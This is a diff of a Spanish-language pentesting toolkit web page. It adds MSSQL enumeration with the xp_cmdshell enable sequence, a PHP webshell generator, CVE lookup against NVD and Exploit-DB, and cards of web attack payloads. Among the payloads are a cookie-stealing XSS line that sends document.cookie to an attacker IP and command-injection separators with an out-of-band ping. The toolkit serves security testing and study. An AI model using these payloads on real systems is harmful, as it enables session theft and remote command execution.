+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script mysql-info IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script mysql-info IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Información general del servidor MySQL</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+          </div>
+        </div>
+
+        <!-- MSSQL -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">1433/TCP</span>
+            <span class="enum-acc-name">MSSQL — Microsoft SQL Server</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+            <div class="svc-whatis"><b>Qué es:</b> Base de datos de Microsoft, muy común en entornos Windows / Active Directory. Se maneja con las herramientas de Impacket. Interesa porque con credenciales de Windows válidas puedes acceder y, si eres administrador (sysadmin), llegar a ejecutar comandos del sistema.</div>
+            <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Acceso con autenticación de Windows (credenciales del dominio)</li>
+              <li data-n="2">Usuario actual con rol sysadmin</li>
+              <li data-n="3">xp_cmdshell activable → ejecución de comandos del sistema (ya es explotación)</li>
+            </ul>
+            <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión a MSSQL con Impacket usando autenticación de Windows</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-req">🔑 Requiere credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">SELECT IS_SRVROLEMEMBER('sysadmin');</div><button class="enum-copy-btn" onclick="enumCopy(this,&quot;SELECT IS_SRVROLEMEMBER('sysadmin');&quot;)">⎘ Copiar</button></div><div class="enum-cmd-desc">Verificar si el usuario actual es administrador (sysadmin) de SQL</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-req">🔑 Requiere credenciales</span></div></div>
+            <div class="enum-cmd-card">
+              <div class="enum-cmd-row" style="align-items:flex-start;">
+                <pre id="xpCmdBlock" class="enum-cmd-code" style="white-space:pre;margin:0;line-height:1.6;">EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXEC xp_cmdshell 'whoami';</pre>
-            <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('xpCmdBlock').textContent)">⎘ Copiar</button>
-            <button class="enum-save-btn" title="Guardar en KB" onclick="saveCmdKB(this,document.getElementById('xpCmdBlock').textContent,'Activar xp_cmdshell en MSSQL para ejecución de comandos','windows','MSSQL','windows-ad',['windows-ad','mssql'])">💾</button>
+                <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('xpCmdBlock').textContent)">⎘ Copiar</button>
+                <button class="enum-save-btn" title="Guardar en KB" onclick="saveCmdKB(this,document.getElementById('xpCmdBlock').textContent,'Activar xp_cmdshell en MSSQL para ejecución de comandos','windows','MSSQL','windows-ad',['windows-ad','mssql'])">💾</button>
+              </div>
+              <div class="enum-cmd-desc">Secuencia completa para activar <code style="color:var(--orange)">xp_cmdshell</code> y ejecutar comandos del sistema desde MSSQL</div>
+              <div class="enum-danger-note">⚠ Esto ya es EXPLOTACIÓN, no enumeración: ejecuta comandos en el sistema. Requiere ser <code style="color:var(--orange)">sysadmin</code> en SQL y pertenece a una fase posterior; está aquí por continuidad.</div>
+            </div>
           </div>
-          <div class="enum-cmd-desc">Secuencia completa para activar <code style="color:var(--orange)">xp_cmdshell</code> y ejecutar comandos del sistema desde MSSQL</div>
         </div>
 
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">SELECT IS_SRVROLEMEMBER('sysadmin');</div><button class="enum-copy-btn" onclick="enumCopy(this,&quot;SELECT IS_SRVROLEMEMBER('sysadmin');&quot;)">⎘ Copiar</button></div><div class="enum-cmd-desc">Verificar si el usuario actual es administrador (sysadmin) de SQL</div></div>
+        <!-- Otros servicios -->
+        <div class="enum-group" style="margin-top:16px;">
+          <div class="enum-group-title">Otros servicios menos comunes</div>
+          <table class="enum-service-table" id="tblOtrosServicios">
+            <thead><tr><th>Puerto</th><th>Servicio</th><th>Comando rápido</th><th></th></tr></thead>
+            <tbody>
+              <tr><td>111</td><td>RPC</td><td><code style="color:var(--orange)">rpcinfo -p IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'rpcinfo -p IP')">⎘</button></td></tr>
+              <tr><td>2049</td><td>NFS</td><td><code style="color:var(--orange)">showmount -e IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'showmount -e IP')">⎘</button></td></tr>
+              <tr><td>5900</td><td>VNC</td><td><code style="color:var(--orange)">nmap --script vnc-info IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script vnc-info IP')">⎘</button></td></tr>
+              <tr><td>6379</td><td>Redis</td><td><code style="color:var(--orange)">redis-cli -h IP ping</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'redis-cli -h IP ping')">⎘</button></td></tr>
+              <tr><td>27017</td><td>MongoDB</td><td><code style="color:var(--orange)">mongo --host IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'mongo --host IP')">⎘</button></td></tr>
+              <tr><td>5432</td><td>PostgreSQL</td><td><code style="color:var(--orange)">psql -h IP -U postgres</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'psql -h IP -U postgres')">⎘</button></td></tr>
+            </tbody>
+          </table>
+          <div class="enum-meta" style="margin-top:8px;"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span><span>Sondeos rápidos de identificación, sin autenticar.</span></div>
+        </div>
       </div>
 
-      <div class="enum-group">
-        <div class="enum-group-title">Post-explotación Windows</div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-psexec administrador:contraseña@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-psexec administrador:contraseña@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Ejecución remota de comandos como SYSTEM vía SMB</div></div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-secretsdump dominio/usuario:contraseña@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-secretsdump dominio/usuario:contraseña@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Extraer hashes NTLM del Active Directory (SAM, LSA, NTDS.dit)</div></div>
-      </div>
 
+      <!-- Windows / AD (id esec-winad conservado para la categorización de guardado en KB) -->
+      <div id="esec-winad">
       <div class="enum-group">
         <div class="enum-group-title">Referencia rápida — Windows vs Linux</div>
         <table class="enum-ttl-table">
@@ -1247,13 +1332,37 @@ EXEC xp_cmdshell 'whoami';</pre>
           </tbody>
         </table>
       </div>
+      </div>
 
-    </div><!-- /esec-winad -->
+      <div class="enum-group">
+        <details class="enum-nmap-ref">
+          <summary style="cursor:pointer;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);padding:8px 0;user-select:none;">📖 Glosario — términos de esta pestaña (clic para desplegar)</summary>
+          <div style="padding-top:10px;">
+            <table class="enum-service-table">
+              <thead><tr><th>Término</th><th>Qué significa</th></tr></thead>
+              <tbody>
+                <tr><td>Fuzzing</td><td>Probar automáticamente muchas rutas o valores para descubrir contenido oculto (ffuf).</td></tr>
+                <tr><td>AXFR</td><td>Transferencia de zona DNS: si está mal configurada, vuelca todos los registros.</td></tr>
+                <tr><td>Open relay</td><td>Servidor SMTP que reenvía correo de cualquiera; permite suplantar dominios.</td></tr>
+                <tr><td>EternalBlue (MS17-010)</td><td>Vulnerabilidad crítica de SMB con ejecución remota.</td></tr>
+                <tr><td>BlueKeep (CVE-2019-0708)</td><td>Vulnerabilidad pre-auth de RDP con ejecución remota.</td></tr>
+                <tr><td>Impacket</td><td>Colección de herramientas Python para hablar protocolos de Windows (SMB, MSSQL…).</td></tr>
+                <tr><td>sysadmin</td><td>Rol de administrador total en SQL Server.</td></tr>
+                <tr><td>RCE</td><td>Remote Code Execution: ejecutar comandos en la máquina objetivo.</td></tr>
+                <tr><td>NSE</td><td>Nmap Scripting Engine: los scripts de nmap que se lanzan con --script (p. ej. -sC).</td></tr>
+                <tr><td>SYN scan (-sS)</td><td>Escaneo sigiloso que no completa la conexión TCP; requiere permisos de root.</td></tr>
+                <tr><td>Ping sweep (-sn)</td><td>Barrido que solo comprueba qué hosts están vivos, sin escanear puertos.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </details>
+      </div>
+    </div><!-- /esec-services -->
   </div><!-- /panel-enum -->
 
   <!-- WEB VULN PANEL -->
   <div class="panel" id="panel-webvuln">
-    <div style="flex:1;overflow-y:auto;padding:16px;">
+    <div id="webvulnScroll" style="flex:1;overflow-y:auto;padding:16px;">
       <div id="webvulnList"></div>
       <div id="webvulnDetail" style="display:none;"></div>
     </div>
@@ -1685,6 +1794,20 @@ export TERM=xterm-256color</pre>
     <div id="dictBody" style="margin-top:6px;"></div>
     <div class="modal-actions">
       <button class="btn-outline" onclick="closeModal('dictModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- WEBSHELL MODAL -->
+<div class="overlay" id="webshellModal">
+  <div class="modal" style="max-width:640px;width:96vw;">
+    <h3>🕸 Generador de webshells (PHP)</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Fichero que subes al servidor (upload, LFI, escritura por SQLi…) y ejecuta comandos por HTTP. Guárdalo como <code style="color:var(--orange)">shell.php</code>.</p>
+    <label>Nombre del parámetro</label>
+    <input type="text" id="webshellParam" value="cmd" oninput="renderWebshell()" placeholder="cmd">
+    <div id="webshellBody" style="margin-top:6px;"></div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('webshellModal')">Cerrar</button>
     </div>
   </div>
 </div>
@@ -2229,7 +2352,7 @@ const OSINT_PLACEHOLDERS={
   whois:'dominio.com', dns:'dominio.com', subdomains:'dominio.com',
   ssl:'dominio.com', wayback:'https://dominio.com', dmarc:'dominio.com',
   robots:'dominio.com',
-  ip:'1.1.1.1', 'reverse-dns':'1.1.1.1', asn:'AS13335 o 8.8.8.8',
+  ip:'1.1.1.1', 'reverse-dns':'1.1.1.1',
   shodan:'apache port:80', virustotal:'dominio.com, IP, URL o hash',
   'email-verify':'usuario@dominio.com', hibp:'usuario@dominio.com o dominio.com',
   hunter:'dominio.com', leakradar:'usuario@dominio.com o @dominio.com',
@@ -2242,7 +2365,7 @@ const OSINT_PLACEHOLDERS={
 const OSINT_PARAM={
   whois:'domain', dns:'domain', subdomains:'domain', ssl:'domain',
   wayback:'url', dmarc:'domain', robots:'domain',
-  ip:'ip', 'reverse-dns':'ip', asn:'query',
+  ip:'ip', 'reverse-dns':'ip',
   shodan:'query', virustotal:'target',
   'email-verify':'email', hibp:'target', hunter:'domain', leakradar:'query',
   headers:'url', urlscan:'query',
@@ -2441,25 +2564,6 @@ function renderOsintResult(tool,q,data){
       html+=_section('Registros A de los hostnames',Object.entries(data.a_records).map(([h,ips])=>
         `<div style="margin-bottom:4px"><span style="color:var(--cyan)">${esc(h)}</span> → ${_chips(ips)}</div>`
       ).join(''));
-    }
-
-  // ── ASN ────────────────────────────────────────────────
-  } else if(tool==='asn'){
-    if(data.asn){
-      html+=_kv([
-        ['ASN', data.asn],
-        ['Nombre', data.name],
-        ['Descripción', data.description],
-        ['País', data.country],
-        ['RIR', data.rir],
-        ['Web', data.website?`<a href="${esc(data.website)}" target="_blank" style="color:var(--blue)">${esc(data.website)}</a>`:''],
-      ]);
-      if(data.prefixes_v4?.length) html+=_section(`Prefijos IPv4 (${data.prefixes_v4.length})`,`<div class="osint-sub-list">${_chips(data.prefixes_v4)}</div>`);
-    } else if(data.prefixes?.length){
-      html+=_section('Prefijos / ASN de esta IP',data.prefixes.map(p=>`
-        <div class="osint-result-card" style="margin-bottom:6px;padding:10px">
-          ${_kv([['Prefijo',p.prefix],['ASN',p.asn],['Nombre',p.name],['País',p.country],['Descripción',p.description]])}
-        </div>`).join(''));
     }
 
   // ── EMAIL VERIFY ───────────────────────────────────────
@@ -2975,12 +3079,124 @@ async function renderGraph(){
 // ─── CVEs ─────────────────────────────────────────────────────────────────────
 const _edbCache={};  // cve_id → {count, exploits, loaded}
 
+// Vacía la caja de búsqueda y vuelve a pintar la lista completa (botón ✕)
+function clearCveSearch(){
+  const inp=document.getElementById('cveSearch');
+  inp.value=''; inp.focus();
+  renderCVEs();
+}
+
+// ─── Filtro por severidad (módulo CVEs) ───────────────────────────────────────
+// _cveSevFilter guarda la severidad activa ('all' | 'critical' | 'high' | ...).
+// renderCVEs() lo lee para filtrar; los botones de la barra llaman a setCveSev.
+let _cveSevFilter='all';
+function setCveSev(sev,btn){
+  _cveSevFilter=sev;
+  document.querySelectorAll('#panel-cves .os-btn').forEach(b=>b.classList.remove('active'));
+  if(btn) btn.classList.add('active');
+  renderCVEs();
+}
+
+// ─── Buscar cualquier CVE por ID en NVD (módulo CVEs) ─────────────────────────
+// Flujo de lookupCVE(id):
+//   1) pide la ficha oficial a /api/cve-lookup (NVD) y la pinta (descripción,
+//      CVSS, CWE, refs). Guarda la respuesta en _lastLookup para poder guardarla.
+//   2) en la misma vista consulta los exploits de EDB (/api/cves/{id}/exploits).
+//   3) el botón "Guardar en KB" llama a saveLookedCVE(), que persiste _lastLookup.
+let _lastLookup=null;
+async function lookupCVE(id){
+  const list=document.getElementById('cvesList');
+  list.innerHTML='<div class="empty-msg">Buscando '+esc(id)+' en NVD…</div>';
+  try{
+    const d=await API.get('/api/cve-lookup?id='+encodeURIComponent(id));
+    _lastLookup=d;
+    const back=`<div style="margin-bottom:8px;"><a href="#" onclick="document.getElementById('cveSearch').value='';renderCVEs();return false;" style="color:var(--cyan);font-size:11px;font-family:var(--mono)">← volver a mis CVEs</a></div>`;
+    if(!d.found){
+      list.innerHTML=back+'<div class="empty-msg">CVE '+esc(id)+' no encontrado en NVD'+(d.error?' ('+esc(d.error)+')':'')+'.</div>';
+      return;
+    }
+    const sev=(d.severity||'').toLowerCase();
+    list.innerHTML=back+`<div class="cve-entry" style="border:1px solid var(--cyan);">
+      <div>
+        <div class="cve-id">${esc(d.cve_id)}</div>
+        ${d.severity?`<span class="cve-sev sev-${sev}">${esc(d.severity)}</span>`:''}
+        ${d.cvss!=null?`<div style="font-size:10px;font-family:var(--mono);color:var(--text3);margin-top:3px">CVSS ${d.cvss}</div>`:''}
+        <a href="https://nvd.nist.gov/vuln/detail/${esc(d.cve_id)}" target="_blank" class="nvd-link">↗ NVD</a>
+        <a href="https://www.exploit-db.com/search?cve=${esc(d.cve_id)}" target="_blank" class="nvd-link" style="color:var(--orange);border-color:rgba(255,102,0,.3);">↗ EDB</a>
+      </div>
+      <div class="cve-body">
+        <div class="cve-desc">${esc(d.description||'Sin descripción')}</div>
+        ${d.cwe&&d.cwe.length?`<div style="margin-top:6px;font-size:10px;font-family:var(--mono);color:var(--purple)">${d.cwe.map(esc).join(' · ')}</div>`:''}
+        ${d.published?`<div style="font-size:10px;color:var(--text3);margin-top:4px">Publicado ${esc(d.published)}${d.modified?' · Modificado '+esc(d.modified):''}</div>`:''}
+        ${d.vector?`<div style="font-size:9px;color:var(--text3);font-family:var(--mono);margin-top:2px">${esc(d.vector)}</div>`:''}
+        ${d.references&&d.references.length?`<div style="margin-top:6px;font-size:10px;color:var(--text3)">Referencias: ${d.references.slice(0,4).map(u=>`<a href="${esc(u)}" target="_blank" style="color:var(--blue)">↗</a>`).join(' ')}</div>`:''}
+        <div id="lookupEdb" style="margin-top:8px;font-size:11px;color:var(--text3)">⟳ Buscando exploits en Exploit-DB…</div>
+        <div style="margin-top:10px;"><button class="btn-outline" onclick="saveLookedCVE(this)">💾 Guardar en KB</button></div>
+      </div>
+    </div>`;
+    // Exploits de EDB en la misma vista
+    try{
+      const edb=await API.get('/api/cves/'+encodeURIComponent(d.cve_id)+'/exploits');
+      const el=document.getElementById('lookupEdb');
+      if(el){
+        if(edb.error && !(edb.count>0)){
+          el.innerHTML=`<span style="font-size:11px;color:var(--orange)">⚠ Exploit-DB no respondió (${esc(edb.error)}). <a href="#" onclick="lookupCVE('${esc(d.cve_id)}');return false;" style="color:var(--cyan)">reintentar</a></span>`;
+        } else {
+          el.innerHTML = edb.count>0
+            ? `<div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-bottom:4px">🔥 ${edb.count} EXPLOIT(S) EN EXPLOIT-DB:</div>`+
+              edb.exploits.map(e=>`<div style="display:flex;gap:6px;align-items:center;margin-bottom:2px;">${e.verified?'<span style="color:var(--green);font-size:10px">✓</span>':'<span style="color:var(--text3);font-size:10px">·</span>'}<a href="${esc(e.url)}" target="_blank" style="font-size:11px;color:var(--orange)">${esc(e.title||e.id)}</a><span style="font-size:10px;color:var(--text3)">${esc(e.date)}</span></div>`).join('')
+            : '<span style="font-size:11px;color:var(--text3)">Sin exploit conocido en Exploit-DB.</span>';
+        }
+      }
+    }catch(err){ const el=document.getElementById('lookupEdb'); if(el) el.innerHTML='<span style="font-size:11px;color:var(--orange)">Error consultando Exploit-DB</span>'; }
+  }catch(e){
+    list.innerHTML='<div class="empty-msg" style="color:var(--red)">Error consultando NVD: '+esc(e.message)+'</div>';
+  }
+}
+// Rellena un CVE existente con los datos oficiales de NVD (botón "↻ Enriquecer").
+// El trabajo lo hace el backend; aquí solo lanzamos la petición y refrescamos.
+async function enrichCVE(cveId, btn){
+  if(btn){ btn.disabled=true; btn.textContent='⟳…'; }
+  try{
+    const r=await API.post('/api/cves/'+encodeURIComponent(cveId)+'/enrich',{});
+    if(r.updated){ await loadAll(); renderCVEs(); setStatus('CVE '+cveId+' enriquecido desde NVD (CVSS '+(r.cvss??'?')+')'); }
+    else { if(btn){btn.disabled=false;btn.textContent='↻ Enriquecer';} setStatus('No se pudo enriquecer: '+(r.error||'desconocido'),'error'); }
+  }catch(e){ if(btn){btn.disabled=false;btn.textContent='↻ Enriquecer';} setStatus('Error enriqueciendo: '+e.message,'error'); }
+}
+// Persiste en la KB el CVE que se acaba de buscar en NVD (POST /api/cves).
+// Ojo: solo se guardan cve_id/descripción/severidad/CVSS; el CWE y las
+// referencias se ven en la ficha pero la tabla no tiene columnas para ellos.
+async function saveLookedCVE(btn){
+  if(!_lastLookup||!_lastLookup.found) return;
+  const d=_lastLookup;
+  btn.disabled=true; btn.textContent='⟳ Guardando…';
+  try{
+    await API.post('/api/cves',{cve_id:d.cve_id,description:d.description,severity:d.severity,cvss:d.cvss});
+    // Refrescamos los datos SIN repintar la ficha, para que la confirmación
+    // "✓ Guardado" siga visible en la propia tarjeta que estás mirando.
+    S.cves=await API.get('/api/cves');
+    btn.textContent='✓ Guardado en la KB';
+    btn.style.color='var(--green)';
+    btn.style.borderColor='var(--green)';
+    setStatus('CVE '+d.cve_id+' guardado en la base de conocimiento');
+  }catch(e){ btn.disabled=false; btn.textContent='💾 Guardar en KB'; setStatus('Error guardando CVE: '+e.message,'error'); }
+}
+
 function renderCVEs(){
   const q=(document.getElementById('cveSearch').value||'').toLowerCase();
   let cves=q?S.cves.filter(c=>c.cve_id.toLowerCase().includes(q)||(c.description||'').toLowerCase().includes(q)):S.cves;
+  if(_cveSevFilter!=='all') cves=cves.filter(c=>(c.severity||'').toLowerCase()===_cveSevFilter);
   document.getElementById('cveCount').textContent=cves.length+' CVEs';
   if(!cves.length){
-    document.getElementById('cvesList').innerHTML='<div class="empty-msg">Sin CVEs registrados.</div>';return;
+    // Si no hay resultados locales pero lo tecleado ES un ID de CVE completo,
+    // ofrecemos buscarlo en NVD en vez de decir simplemente "sin CVEs".
+    const qt=q.trim();
+    if(/^cve-\d{4}-\d{4,}$/i.test(qt)){
+      document.getElementById('cvesList').innerHTML=`<div class="empty-msg">No tienes <b>${esc(qt.toUpperCase())}</b> en tu KB.<br><button class="btn-outline" style="margin-top:10px" onclick="lookupCVE('${esc(qt.toUpperCase())}')">🔎 Buscar en NVD</button></div>`;
+    } else {
+      document.getElementById('cvesList').innerHTML='<div class="empty-msg">Sin CVEs registrados.</div>';
+    }
+    return;
   }
   document.getElementById('cvesList').innerHTML=cves.map(c=>{
     const sevClass=`sev-${(c.severity||'info').toLowerCase()}`;
@@ -2998,6 +3214,7 @@ function renderCVEs(){
         ${c.cvss?`<div style="font-size:10px;font-family:var(--mono);color:var(--text3);margin-top:3px">CVSS ${c.cvss}</div>`:''}
         <a href="https://nvd.nist.gov/vuln/detail/${esc(c.cve_id)}" target="_blank" class="nvd-link">↗ NVD</a>
         <a href="https://www.exploit-db.com/search?cve=${esc(c.cve_id)}" target="_blank" class="nvd-link" style="color:var(--orange);border-color:rgba(255,102,0,.3);">↗ EDB</a>
+        <button class="nvd-link" style="cursor:pointer;background:none;border:none;padding:0;color:var(--cyan);" onclick="enrichCVE('${esc(c.cve_id)}',this)" title="Rellenar CVSS, severidad y descripción oficiales desde NVD">↻ Enriquecer</button>
         <div style="margin-top:6px;">${edbBadge}</div>
       </div>
       <div class="cve-body">
@@ -3014,6 +3231,14 @@ async function loadEDB(cveId, badgeEl){
   if(badgeEl) badgeEl.textContent='⟳ Consultando EDB...';
   try{
     const data=await API.get(`/api/cves/${encodeURIComponent(cveId)}/exploits`);
+    // Fallo de Exploit-DB (502/timeout): no es "sin exploit", es que no respondió.
+    // No cacheamos el fallo y dejamos el badge para reintentar.
+    if(data.error && !(data.count>0)){
+      const sid=cveId.replace(/[^a-z0-9]/gi,'_');
+      const b=document.getElementById('edb-'+sid)||badgeEl;
+      if(b){ b.className='edb-badge edb-pending'; b.textContent='⚠ EDB — reintentar'; b.title=data.error; }
+      return;
+    }
     _edbCache[cveId]={count:data.count||0,exploits:data.exploits||[],loaded:true};
     // Update badge
     const safeId=cveId.replace(/[^a-z0-9]/gi,'_');
@@ -3107,7 +3332,7 @@ function switchTab(name){
   if(name==='osint') loadOsintHistory();
   if(name==='audits' && !S.currentAudit) selectAudit('web-app', document.querySelector('.audit-type-btn'));
   if(name==='mitre') loadMitre();
-  if(name==='enum') initEnumSaveButtons();
+  if(name==='enum'){ initEnumSaveButtons(); initEnumTarget(); highlightServices(); }
   if(name==='webvuln') renderWebVulnList();
 }
 
@@ -4241,6 +4466,7 @@ function openShellStabModal(){
     </div>`;
   }).join('');
   document.getElementById('shellStabModal').classList.add('show');
+  const _sm=document.querySelector('#shellStabModal .modal'); if(_sm) _sm.scrollTop=0;
 }
 
 // ─── REVERSE SHELL GENERATOR ──────────────────────────────────────────────────
@@ -4286,9 +4512,17 @@ function renderRevShell(){
 }
 
 // ─── WEB VULNERABILITIES MODULE ───────────────────────────────────────────────
+// Categorías del OWASP Top 10 2021 usadas para agrupar las fichas
+const OWASP_CATS=[
+  {id:'A01', name:'A01 · Broken Access Control', desc:'Acceder a recursos u operaciones que no te corresponden.'},
+  {id:'A03', name:'A03 · Injection', desc:'Entrada no confiable interpretada como código o consulta (SQLi, XSS, comandos, plantillas…).'},
+  {id:'A05', name:'A05 · Security Misconfiguration', desc:'Configuraciones inseguras del servidor o los parsers (incluye XXE).'},
+  {id:'A10', name:'A10 · SSRF', desc:'Forzar al servidor a hacer peticiones a destinos internos.'},
+];
+
 const WEB_VULNS=[
   {
-    id:'path-traversal', icon:'📂', name:'Path Traversal / LFI / RFI', tag:'File Inclusion',
+    id:'path-traversal', owasp:'A01', icon:'📂', name:'Path Traversal / LFI / RFI', tag:'File Inclusion',
     sub:'Lectura de ficheros arbitrarios y ejecución remota vía parámetros de ruta.',
     desc:'Un parámetro de la aplicación incluye o lee ficheros del servidor sin sanitizar la ruta. Path Traversal permite salir del directorio esperado; LFI incluye ficheros locales (a veces con ejecución de código); RFI incluye ficheros remotos controlados por el atacante.',
     detection:'Parámetro que acepta rutas de fichero: filename=, file=, path=, page=, include=, template=. Probar con un fichero conocido y observar si su contenido aparece en la respuesta.',
@@ -4303,7 +4537,7 @@ const WEB_VULNS=[
     files:['/etc/passwd','/etc/shadow','config.php','wp-config.php','~/.ssh/id_rsa','.bash_history'],
   },
   {
-    id:'xxe', icon:'📄', name:'XXE (XML External Entity)', tag:'XML',
+    id:'xxe', owasp:'A05', icon:'📄', name:'XXE (XML External Entity)', tag:'XML',
     sub:'Inyección de entidades externas en parsers XML → lectura de ficheros y SSRF.',
     desc:'El servidor parsea XML controlado por el usuario con las entidades externas habilitadas. Permite leer ficheros locales, hacer SSRF e incluso RCE en ciertos contextos.',
     detection:'Cabecera Content-Type o Accept con application/xml; endpoint que espera XML (SOAP, APIs, uploads de documentos como .docx/.svg).',
@@ -4314,7 +4548,7 @@ const WEB_VULNS=[
     ],
   },
   {
-    id:'ssrf', icon:'🌐', name:'SSRF (Server-Side Request Forgery)', tag:'Request Forgery',
+    id:'ssrf', owasp:'A10', icon:'🌐', name:'SSRF (Server-Side Request Forgery)', tag:'Request Forgery',
     sub:'Forzar al servidor a hacer peticiones a destinos internos.',
     desc:'La aplicación hace una petición HTTP a una URL controlada por el usuario. Permite alcanzar servicios internos (127.0.0.1, metadata cloud, red interna) que no son accesibles desde fuera.',
     detection:'Parámetro cuyo valor es una URL: url=, uri=, path=, dest=, redirect=, fetch=, callback=, webhook=.',
@@ -4336,8 +4570,8 @@ const WEB_VULNS=[
     note:'💡 Usa Burp Intruder para escanear la red interna: itera IPs (192.168.x.x, 10.x.x.x) y puertos comunes en el parámetro vulnerable para mapear servicios internos.',
   },
   {
-    id:'ssti', icon:'🧩', name:'SSTI (Server-Side Template Injection)', tag:'Template Injection',
-    sub:'Inyección en motores de plantillas → de reflected a RCE.',
+    id:'ssti', owasp:'A03', icon:'🧩', name:'SSTI (Server-Side Template Injection)', tag:'Template Injection',
+    sub:'Inyección en motores de plantillas → de inyección simple a RCE.',
     desc:'La entrada del usuario se concatena directamente en una plantilla del lado servidor. Según el motor puede escalar de simple inyección a ejecución remota de comandos.',
     detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
     engineTable:[
@@ -4347,42 +4581,111 @@ const WEB_VULNS=[
       {payload:'@(7*7)',        result:'49', engine:'Razor (.NET)'},
       {payload:'#{7*7}',        result:'49', engine:'Ruby / Thymeleaf'},
     ],
+  },
+  {
+    id:'xss', owasp:'A03', icon:'⚡', name:'XSS (Cross-Site Scripting)', tag:'Injection',
+    sub:'Inyección de JavaScript que se ejecuta en el navegador de otros usuarios.',
+    desc:'La aplicación devuelve entrada del usuario dentro del HTML sin sanitizar, permitiendo inyectar JavaScript que se ejecuta en el navegador de la víctima. Reflejado: el payload viaja en la petición (enlace malicioso). Almacenado: queda guardado (comentario, perfil) y afecta a todo el que lo vea. DOM: la manipulación ocurre en el propio JS del cliente.',
+    detection:'Meter una cadena única (p. ej. zqx123) en cada campo o parámetro y buscarla en el HTML de la respuesta: ver si sale escapada (&lt;) o cruda (<). Fijarse en el contexto donde cae: HTML, atributo, dentro de \x3cscript\x3e o en una URL.',
     payloads:[
-      {code:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`, d:'RCE en Jinja2 — ejecuta "id" vía os.popen'},
+      {code:'\x3cscript\x3ealert(document.domain)\x3c/script\x3e', d:'Prueba básica — confirma ejecución de JavaScript'},
+      {code:'">\x3cscript\x3ealert(1)\x3c/script\x3e', d:'Rompe primero un atributo HTML y luego inyecta'},
+      {code:'\x3cimg src=x onerror=alert(1)\x3e', d:'Sin la etiqueta script — útil si está filtrada'},
+      {code:'\x3csvg onload=alert(1)\x3e', d:'Vector alternativo con SVG'},
+      {code:'javascript:alert(1)', d:'En contexto de href / URL (enlaces)'},
+      {code:`\x3cscript\x3enew Image().src='http://IP_ATACANTE/c?='+document.cookie\x3c/script\x3e`, d:'Robo de cookies — exfiltra la sesión a tu servidor'},
     ],
+    note:'💡 Si la cookie de sesión tiene HttpOnly, robarla con document.cookie no funciona: pivota a hacer acciones en nombre de la víctima (cambiar email/contraseña) o a keylogging.',
+  },
+  {
+    id:'cmd-injection', owasp:'A03', icon:'🖥️', name:'Command Injection', tag:'Injection',
+    sub:'Ejecutar comandos del sistema operativo a través de la aplicación.',
+    desc:'La aplicación pasa entrada del usuario a una llamada del sistema (shell) sin sanitizar, y se pueden ejecutar comandos arbitrarios del SO. Aparece a menudo en funciones que hacen ping, lookups DNS, conversión de ficheros, etc.',
+    detection:'Parámetros que alimentan utilidades del sistema (host=, ip=, domain=, cmd=, filename=). Encadenar un comando con un separador y ver si se ejecuta (retraso con sleep, o salida de whoami).',
+    bypassGroups:[
+      {name:'Separadores de comando', items:[
+        {code:'; whoami', d:'Punto y coma — ejecuta el segundo comando tras el primero'},
+        {code:'| whoami', d:'Pipe — pasa la salida y ejecuta el segundo'},
+        {code:'|| whoami', d:'OR — se ejecuta si el primero falla'},
+        {code:'& whoami', d:'Ejecuta ambos'},
+        {code:'`whoami`', d:'Sustitución de comando (backticks)'},
+        {code:'$(whoami)', d:'Sustitución de comando (sintaxis moderna)'},
+      ]},
+      {name:'A ciegas (sin ver la salida)', items:[
+        {code:'; sleep 5', d:'Blind — si la respuesta tarda 5s, hay ejecución'},
+        {code:'; ping -c 3 IP_ATACANTE', d:'Blind out-of-band — confírmalo capturando el ping en tu máquina'},
